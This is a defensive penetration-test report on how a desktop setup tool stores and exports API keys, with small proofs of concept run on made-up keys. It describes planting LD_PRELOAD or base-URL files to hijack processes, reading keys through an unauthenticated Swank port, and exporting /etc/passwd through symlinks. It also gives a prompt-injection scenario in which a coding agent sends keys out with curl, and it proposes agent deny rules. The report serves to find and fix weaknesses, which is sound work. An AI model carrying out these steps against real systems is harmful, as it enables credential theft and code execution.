# Pen test: `vikix ai key` (Vikix 0.40.0, commit 37928a3), 2026-09-28

Scope: `bin/vikix-ai`, `lib/secrets.sh`, how `config/bash/vikix.bash` and `bin/vikix-session` source it, the snapshot exclusions in `bin/vikix`, and `vikix doctor`. Threat model: a single-user laptop. The "attackers" that matter are (a) a program running as the user, such as a malicious npm/Emacs/pip package or an AI agent acting on a prompt injection, (b) anything that can reach the user's loopback ports, and (c) the user making a mistake.

How it was tested: I read the code, then ran PoCs with made-up keys in a throwaway `HOME`/`VIKIX_STATE` under the session scratchpad. On the real machine I only looked at file modes and processes. I did not read `~/.config/vikix/secrets` (it doesn't exist on this machine). I made no changes to the repository apart from this report.

Most of the design holds up. Values never reach argv. No eval. The file is created 600 by an atomic rename. The session trace is switched off around the export. `check` prints only line numbers and commit hashes. The weak points are in what the folder will export, and in who can read the environment once it is exported.

---

## 1. HIGH (suspected): the Windows VM can probably reach Swank on 127.0.0.1:4004, and with it every key and code execution as the user

**Who / what:** a program or person inside the Windows 11 guest (`vikix windows`) gets arbitrary Lisp in StumpWM, which runs as the user. That gives `(sb-posix:getenv "ANTHROPIC_API_KEY")`, and also `run-shell-command`, so the whole account. This problem is older than 0.40.0. What 0.40.0 changes is that StumpWM's environment now holds every API key.

**Evidence:**
- `bin/vikix-windows:259` uses `--network type=user,backend.type=passt,model=virtio`, with no option that turns gateway mapping off.
- `man passt` (passt-2026.01.20 is installed): `--map-host-loopback addr` … "Default is to translate the guest's default gateway address, unless --no-map-gw is given". Packets from the guest to its gateway "will appear to have both source and destination of 127.0.0.1" on the host.
- `config/stumpwm/vikix/swank.lisp` runs `swank:create-server :port 4004` with no authentication (no `~/.slime-secret`).
- Any other local UID can also connect to 127.0.0.1:4004, because TCP loopback has no owner check. On this single-user laptop that means system daemons only.

**Not confirmed:** I did not start the Windows guest. I don't know whether libvirt 12.7 adds `--no-map-gw` by itself. To verify, run this in the guest: `Test-NetConnection (Get-NetRoute 0.0.0.0/0).NextHop -Port 4004`. If it says `TcpTestSucceeded : True`, this finding is confirmed.

**Fix:**
- `bin/vikix-windows`: stop the guest reaching host loopback. libvirt's passt backend has no XML knob for this. Two options:
  - use the libvirt `default` NAT network (`--network network=default`), where host services bound to 127.0.0.1 are not reachable; or
  - put a `passt` wrapper earlier in the qemu user's PATH (fragile).
- `swank.lisp`: independent of the VM, move Swank to a Unix socket in `$XDG_RUNTIME_DIR` (mode 700), or require a secret: write a random `~/.slime-secret` (600) at session start. Swank checks it on connect, and `bin/vikix-eval` would need to send it. This also closes the "other local UID" path.
- Both files are linked into the checkout, so `vikix update` delivers them. An already-defined Windows domain needs a migration that runs `virt-xml --edit --network …`.

---

## 2. MEDIUM (confirmed): the secrets folder exports any variable name, and changes to it are hidden from `vikix changes`

**Who / what:** any program running as the user, or an AI agent. It can drop a file named `ANTHROPIC_BASE_URL`, `OPENAI_BASE_URL`, `HTTPS_PROXY`, `LD_PRELOAD`, `BASH_ENV` or `PATH` into `~/.config/vikix/secrets/`. Every new shell and the next session then export it. The effects are:
- every Claude Code / SDK call, key included, goes to the attacker's endpoint;
- or code runs in every process.

The same could be done in `~/.bashrc`, but there `vikix changes` shows it and `vikix undo` removes it. That is exactly the safety net `vikix agent` relies on. The secrets folder is excluded from snapshots, so a change there is invisible to it. The user can also break things by accident with `vikix ai key set PATH`.

**Evidence:**
- `bin/vikix-ai:40`: an all-caps name without `-` is kept exactly as typed.
- `lib/secrets.sh:18-21` skips only names that aren't valid identifiers.
- PoC:
  ```
  $ for n in PATH LD_PRELOAD BASH_ENV PROMPT_COMMAND; do echo "val-$n" | vikix-ai key set $n; done
  :: kept PATH in …/secrets/          (and the other three)
  $ sh -c '. lib/secrets.sh; echo $PATH'
  ERROR: ld.so: object 'val-LD_PRELOAD' from LD_PRELOAD cannot be preloaded …
  sh: 21: lib/secrets.sh: cat: not found
  PATH=val-PATH
  ```

**Fix:**
- `lib/secrets.sh`: export only names that match `*_API_KEY` (add `*_TOKEN` if you want `GITHUB_TOKEN`/`HF_TOKEN`), and skip symlinks:
  ```sh
  case $_vikix_n in *_API_KEY) ;; *) continue ;; esac
  [ -L "$_vikix_f" ] && continue
  ```
- `bin/vikix-ai` `var_name`: after mapping, `die` unless the result ends in `_API_KEY`. That rejects `PATH`, `ANTHROPIC_BASE_URL` and the rest.
- `cmd_check`: warn about any entry in the folder that isn't a regular file named `*_API_KEY`. Print its name only, never its contents. This makes a planted file visible in `vikix doctor`.
- Both files are linked, so `vikix update` delivers the change and no migration is needed.

---

## 3. MEDIUM (confirmed from Claude Code's docs, not run): Claude Code, and anything the agent runs, gets `ANTHROPIC_API_KEY`

**Who / what:** two things.
- **Silent billing.** Per Claude Code's authentication docs, "In non-interactive mode (`-p`), the key is always used when present". Any script, hook or skill running `claude -p` in a Vikix shell silently bills the API key and not the user's plan. claude.ai connectors and `/schedule` also stop working while the key is the active credential. The warning in `cmd_set` covers only the interactive prompt.
- **Exposure.** The agent's Bash tool inherits the whole environment. An `env` or `printenv` run while debugging, which agents do routinely, copies every key into the conversation. From there it is sent to the model and stored in `~/.claude/projects/*.jsonl` (600 here, but those files get shared and quoted). A prompt injection needs only `curl … -d "$OPENAI_API_KEY"`. The skill's "never read secrets/" rule does not cover `$VAR`.

**Evidence:**
- `lib/secrets.sh` is sourced into every shell (`config/bash/vikix.bash:45-48`) and into the session (`bin/vikix-session:23-26`).
- `bin/vikix:307` runs `exec claude "$@"` with that environment.
- https://code.claude.com/docs/en/iam ("Authentication precedence", item 3).

**Fix (proportionate, and it keeps "every program sees the keys"):**
- `bin/vikix` `cmd_agent`: `exec env -u ANTHROPIC_API_KEY claude "$@"`, unless the user opted in. The opt-in can be a marker such as `~/.config/vikix/claude-uses-api-key`, set by a question in `vikix ai key set anthropic`.
- `config/bash/vikix.bash`: add the same as a function, so a bare `claude` behaves the same way:
  ```bash
  claude() { if [ -e "${XDG_CONFIG_HOME:-$HOME/.config}/vikix/claude-uses-api-key" ]; then command claude "$@"; else env -u ANTHROPIC_API_KEY claude "$@"; fi; }
  ```
  A user who wants the key for Claude Code should prefer `apiKeyHelper` in `~/.claude/settings.json` (`cat ~/.config/vikix/secrets/ANTHROPIC_API_KEY`) over the env var.
- `config/claude/skills/vikix/SKILL.md`: add "never run `env`, `printenv`, `set`, or echo a `*_API_KEY` variable; to test whether a key is set use `[ -n "${X:+1}" ]`".
- Optionally, 40-config can seed `permissions.deny` in `~/.claude/settings.json` with `Read(~/.config/vikix/secrets/**)`, `Bash(env)` and `Bash(printenv:*)`. These rules stop accidents, not a determined agent. `settings.json` is the user's file, so this needs a migration that merges the rules in with `jq`, and only if they are missing.

---

## 4. LOW (confirmed): a key typed where the NAME goes, or after it, ends up in shell history. The tool keeps it as a file name and prints it

**Who / what:** a user mistake that the tool could catch. `vikix ai key set sk-ant-…` or `vikix ai key set anthropic sk-ant-…` puts the key in `~/.bash_history` and, while the command runs, in `/proc/PID/cmdline`, which every local user can read.

- With the key as NAME, it passes `var_name`. It is then printed (uppercased), used as a file name, and printed again by `list`, by `remove` and in errors.
- With the key as an extra argument, the argument is silently ignored.

Uppercasing makes the printed form unusable as a key, but the real key is still in the shell history.

**Evidence (made-up key):**
```
$ echo x | vikix-ai key set sk-ant-api03-FAKEFAKEabcdefghijklmnop
:: kept SK_ANT_API03_FAKEFAKEABCDEFGHIJKLMNOP_API_KEY in …/secrets/
$ vikix-ai key list
SK_ANT_API03_FAKEFAKEABCDEFGHIJKLMNOP_API_KEY set 2026-09-28
$ echo | vikix-ai key set anthropic sk-ant-api03-FAKE…
xx no key given; nothing kept              # the argument was silently dropped
```

**Fix (`bin/vikix-ai`):**
- In `var_name`, refuse a name that matches `KEY_PATTERN`, starts with `sk-`, or is longer than about 40 characters, with a message like "that looks like the key itself: it is now in your shell history. Remove it (`history -d $((HISTCMD-1))`, or edit ~/.bash_history), and replace the key if in doubt."
- In the dispatcher, reject a fourth argument to `set` with the same message.

Linked file, so no migration is needed.

---

## 5. LOW (confirmed): `check` misses common key formats and some files

**Who / what:** a key committed to the snapshot history that `vikix doctor` reports as clean.

**Evidence (PoC against the exact `KEY_PATTERN`):**
```
MISSED  (setq gptel-api-key "AIzaSy…")         # Gemini key in Lisp/elisp
MISSED  export GITHUB_TOKEN=ghp_…
MISSED  export HF_TOKEN=hf_…
MISSED  xai-…                                   # xAI
MISSED  API_KEY=…  /  api_key=…                 # bare or lowercase names
MISSED  AWS_SECRET_ACCESS_KEY=… AKIA…
FOUND   sk-ant-…, sk-proj-…, sk-…, *_API_KEY=literal, set -gx OPENAI_API_KEY sk-…
```

Other gaps:
- **Non-ASCII file names.** `yours_files` uses `git ls-files` without `-z`, and git quotes non-ASCII names (`"\303\251"`), so `$HOME/$f` doesn't exist and the file is silently skipped. PoC: a key in `~/.stumpwm.d/clé.lisp` was reported only through the history, never as a file and line.
- **Binary files.** Files with a NUL byte are skipped by `grep -I` and are also invisible to `git log -G`, since git treats them as binary.
- **Reflog.** `git log --all` doesn't look at reflog-only commits. PoC: after an amend, `--all` found nothing and `--reflog` found it. Vikix doesn't amend today, so this only matters later.
- **The set-aside repo.** The fix `check` suggests (`mv yours.git yours.git.with-key`) leaves a full copy of the key in `~/.local/state/vikix/yours.git.with-key`, which restic backs up and `check` never looks at again.

**Fix (`bin/vikix-ai`):**
- Extend the ERE. Add alternatives for:
  - `AIza[0-9A-Za-z_-]{35}`
  - `gh[pousr]_[A-Za-z0-9]{30,}` and `github_pat_[A-Za-z0-9_]{40,}`
  - `hf_[A-Za-z0-9]{30,}`
  - `xai-[A-Za-z0-9]{30,}`
  - `AKIA[0-9A-Z]{16}`
  - and the variable form widened to `[A-Za-z_]*(API_KEY|api_key|api-key|_TOKEN|_SECRET)[\"' ]*[=: ]+[\"']?[A-Za-z0-9_-]{16,}`.

  Keep the "not `$(...)`/`$VAR`" property and add each format to `tests/ai.sh`.
- `yours_files`: use `git -c core.quotePath=false ls-files -z …` and read the output with `read -r -d ''`.
- `git log` over the history: use `--all --reflog`.
- Warn when `$YOURS_GIT.with-key` exists: "delete it once the new history is right".

---

## 6. LOW (confirmed): symlinks at the folder or its files are followed

**Who / what:**
- **User setup.** If `~/.config/vikix` (or `secrets/`) is a symlink into a dotfiles repo, as `~/.bashrc` already is on this machine (it links into `~/.dotfiles`), `set` writes the key into that git work tree, which may get pushed.
- **A program running as the user.** It can plant `secrets/FOO_API_KEY -> /some/file`, and `secrets.sh` exports that file's contents. A symlink to a large file, or a big planted file, makes the environment exceed ARG_MAX, and every `exec` in every new shell then fails with E2BIG.

**Evidence:**
- PoC 1: with `secrets -> $t/elsewhere`, `set` wrote `elsewhere/ANTHROPIC_API_KEY` and chmodded `elsewhere` to 700. `check` then said "others can read …; fix it: chmod 700 …", because it saw the symlink's own 777 mode. That advice doesn't fix anything.
- PoC 2: with `secrets/PASSWD_API_KEY -> /etc/passwd`, `sh -c '. lib/secrets.sh; echo ${PASSWD_API_KEY%%:*}'` printed `root`.

**Fix:**
- `bin/vikix-ai` `secure_folder`: refuse if `$SECRETS` or `$(dirname "$SECRETS")` is a symlink (`[ -L ]`). Also refuse if `git -C "$SECRETS" rev-parse --is-inside-work-tree` succeeds, with a message saying why. Use `mkdir -p -m 700`, or run `(umask 077; mkdir -p …)`, so the folder is never briefly 755.
- `cmd_check`: report a symlinked folder as such, with the right advice.
- `lib/secrets.sh`: skip `-L` entries (as in finding 2) and files over 8 KiB (`[ "$(wc -c < "$f")" -le 8192 ]`), so they can't cause the E2BIG failure above.

---

## 7. LOW (design; mitigation proposed): keys reach third-party code that never needs them

**Who / what:** a malicious package that does the common "dump `process.env`/`os.environ` and send it home". When `vikix update` or an install is run from a terminal, these all inherit every key:
- `npm install -g` lifecycle scripts (`install/45-editors.sh:59`)
- `uv pip install` builds (`install/67-dev.sh:412`)
- Quicklisp loads and `curl … | bash` installers

Emacs package code (MELPA, unsigned) runs in the daemon that `bin/vikix-session:67` starts with the keys. Malware that reads files directly could read `secrets/` anyway, so this only stops the lazy, env-harvesting kind. That is still the common kind.

**Fix (proportionate, keeps interactive shells and the desktop as asked):** in `lib/common.sh`, which every stage and `vikix update` source, unset them for install work:
```bash
for _v in $(compgen -e); do case $_v in *_API_KEY) unset "$_v" ;; esac; done; unset _v
```
Nothing Vikix installs needs a key. Linked file, so no migration is needed.

---

## 8. LOW (suspected, by clipmenu's design): the pasted key stays in clipboard history

**Who / what:** someone who sees the screen or a screen share (Super+c lists clips), or a program running as the user that reads the clip cache.

**Evidence:**
- `bin/vikix-session:51` runs `clipmenud`.
- Its cache is `/run/user/1000/clipmenu.6.vukini` (700, tmpfs, so it is gone at reboot).
- The advised flow is "copy the key from the console, paste it into `vikix ai key set`".

**Fix:** at the end of `cmd_set` in `bin/vikix-ai`, when `clipdel` exists, run `clipdel -d '^[[:space:]]*(sk-|AIza|xai-|gsk_|hf_)'`. That drops matching clips without putting the key in argv. Then tell the user: "removed from clipboard history". Clear the live selection too: `printf '' | xclip -selection clipboard`.

---

## 9. INFORMATIONAL (confirmed): small correctness issues in `set` and `remove`

- **Digit-first names.** `vikix ai key set 1min` keeps `1MIN_API_KEY`, but `secrets.sh` never exports it (PoC: `env | grep -c 1MIN_API_KEY` gave 0). Fix: `var_name` should refuse names starting with a digit.
- **Directory in the way.** If `secrets/OPENAI_API_KEY` is a directory, `mv -f` moves the temp file into it (`secrets/OPENAI_API_KEY/.new.bhNmjN`) and the tool still says "kept". Fix: `mv -fT`, or check `[ -d ]` first.
- **Interrupted set.** No `trap` removes `$tmp` if `set` is interrupted. The leftover `.new.*` is 600 inside a 700 folder, so it is harmless but stale. Fix: `trap 'rm -f "$tmp"' EXIT` after `mktemp`.
- **Removal isn't erasure.** `remove`/`mv` over an old key doesn't erase it from disk, which is normal. The README could say "replacing a key means revoking it at the provider".
- **Core dumps.** `ulimit -c` is 0 and `core_pattern` is `core`. A program that raises its own limit would dump its environment, keys included, into its working directory. Nothing to change unless you add `ulimit -Sc 0` to `vikix-session`.
- **`check` doesn't read `~/.bash_history`** (600 here). That is where `export OPENAI_API_KEY=…` typed at a prompt ends up, and restic backs it up. Consider having `check` scan it too (line numbers only) and advise `history -d`.

---

## Checked and fine

- **No value injection.** `export "$n=$(cat f)"` is quoted and never evaluated. PoC: a value containing `; touch …` and `$(touch …)` created nothing in sh or bash.
- **The key never reaches argv in `set`.** `read -s`, then `printf` (a builtin) piped to `tr`. The key is not echoed on a tty.
- **File creation.** `mktemp` runs under `umask 077`, so the file is 600 from the start. `chmod` is a no-op after that, and `mv` is an atomic rename in the same folder. A pre-existing folder owned by someone else makes `chmod` fail and `set -e` stop.
- **Names can't escape the folder.** `var_name` allows only `[A-Za-z0-9_-]`, so no `/`, `..` or leading-dot tricks.
- **`list` prints names and dates only.** `remove` works by name only.
- **`check` output.** It runs grep on one file at a time, so there is no file-name prefix, and `cut -d: -f1` keeps only the line number. The history report gives abbreviated hashes only. The test asserts neither the key nor a fragment of it appears. `git log -G` does use the ERE (it matched with and without `-E`).
- **Snapshots.** `info/exclude` holds `/.config/vikix/secrets/` and is rewritten on every snapshot. `yours_stage` refuses yours.list lines naming the folder, and `yours_files` skips it.
- **session.log.** Tracing is off (`{ set +x; } 2>/dev/null`) around the source. Nothing else in `install.sh`, `install/`, `lib/`, `bin/` or `migrations/` uses `set -x` or dumps the environment (`env`, `printenv`, `declare -p`, `export -p`, `dbus-update-activation-environment --all`). session.log itself is 644, but it holds no keys.
- **The environment isn't readable by others.** `/proc/PID/environ` is same-UID only. No `sudo -E`/`--preserve-env` anywhere, so root commands get a reset environment.
- **Existing files are safe.** `~/.bash_history` is 600 and the Claude transcripts are 600. The skill tells the agent never to read `secrets/` or run `key set` itself (finding 3 covers what it misses).
- **Restic backups.** They include the folder on purpose and are encrypted. That is acceptable, given the README says so.
